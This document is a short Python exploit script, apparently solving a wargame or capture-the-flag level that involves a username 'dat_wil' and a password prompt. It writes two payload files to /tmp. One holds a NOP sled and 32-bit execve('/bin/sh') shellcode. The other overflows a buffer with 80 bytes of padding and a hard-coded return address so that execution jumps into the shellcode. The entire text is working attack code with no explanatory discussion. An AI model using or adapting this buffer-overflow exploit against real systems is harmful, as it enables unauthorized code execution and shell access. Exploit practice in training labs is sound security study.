#!/usr/bin/env python
import struct

# 32-bit execve("/bin/sh") shellcode
shellcode = (
    b"\x31\xc0"
    b"\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3"
    b"\x50"
    b"\x53"
    b"\x89\xe1"
    b"\x99"
    b"\xb0\x0b"
    b"\xcd\x80"
)

# 1) Username: "dat_wil" + NOP sled + shellcode
user  = b"dat_wil"
user += b"\x90" * 64        # bigger NOP sled
user += shellcode
user += b"\n"

open("/tmp/user01", "wb").write(user)

# 2) Password: padding + return address into NOP sled
padding = b"A" * 80         # offset to EIP (from walkthrough)
ret_addr = 0x0804a050       # address inside a_user_name NOP sled

password  = padding
password += struct.pack("<I", ret_addr)
password += b"\n"

open("/tmp/pass01", "wb").write(password)